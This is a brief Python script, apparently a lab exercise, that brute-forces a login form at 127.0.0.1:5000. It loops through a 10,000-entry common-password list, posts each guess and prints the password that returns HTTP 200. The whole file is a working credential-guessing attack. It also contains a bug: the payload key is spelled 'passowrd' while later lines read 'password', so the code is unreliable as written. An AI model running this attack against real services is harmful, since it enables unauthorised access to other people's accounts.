import requests

def try_password(password, print_all=False):
    url='http://127.0.0.1:5000/login'

    #define the payload for the post request
    payload = {'passowrd':password}

    #make the request
    r = requests.post(url, json=payload)

    if(print_all):
        print(payload['password'] + ":" + str(r.status_code))

    #determine if we've gained access 200 = success
    if(r.status_code == 200):
        print("The password is: " + payload['password'])
        return True 
    else:
        return False 

with open('nist_10000.txt', newline='') as bad_passwords:
    nist_bad = bad_passwords.read().split('\n')
print(nist_bad[1:10])
for i in range(len(nist_bad)):
    try_password(nist_bad[i])